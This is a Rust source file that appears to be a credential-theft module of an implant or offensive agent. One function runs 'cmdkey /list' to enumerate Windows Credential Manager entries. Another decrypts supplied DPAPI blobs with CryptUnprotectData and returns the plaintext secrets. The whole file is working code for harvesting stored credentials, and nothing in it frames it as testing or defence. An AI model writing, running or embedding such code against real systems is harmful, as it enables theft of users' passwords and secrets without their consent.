use anyhow::Result;

pub async fn vault() -> Result<String> {
    #[cfg(target_os = "windows")]
    return vault_windows();
    #[cfg(not(target_os = "windows"))]
    Ok("credential vault: platform not supported".into())
}

#[cfg(target_os = "windows")]
fn vault_windows() -> Result<String> {
    // Enumerate Windows Credential Manager entries
    let out = std::process::Command::new("cmdkey")
        .args(["/list"])
        .output()?;
    Ok(String::from_utf8_lossy(&out.stdout).into_owned())
}

pub async fn dpapi(args: &[String]) -> Result<String> {
    // Decrypt a DPAPI blob: args[0] = hex-encoded blob
    if args.is_empty() {
        return Err(anyhow::anyhow!("usage: creds_dpapi <hex_blob>"));
    }

    #[cfg(target_os = "windows")]
    {
        let blob = hex::decode(&args[0])?;
        return dpapi_decrypt(&blob);
    }
    #[allow(unreachable_code)]
    Ok(format!("dpapi stub: {} bytes", args[0].len() / 2))
}

#[cfg(target_os = "windows")]
fn dpapi_decrypt(blob: &[u8]) -> Result<String> {
    use windows_sys::Win32::Security::Cryptography::CryptUnprotectData;
    use windows_sys::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB;
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: blob.len() as u32,
            pbData: blob.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB { cbData: 0, pbData: std::ptr::null_mut() };
        if CryptUnprotectData(&mut input, std::ptr::null_mut(), std::ptr::null_mut(),
                              std::ptr::null_mut(), std::ptr::null_mut(), 0,
                              &mut output) != 0 {
            let out_slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
            let result = String::from_utf8_lossy(out_slice).into_owned();
            windows_sys::Win32::Foundation::LocalFree(output.pbData as _);
            return Ok(result);
        }
    }
    Err(anyhow::anyhow!("CryptUnprotectData failed"))
}
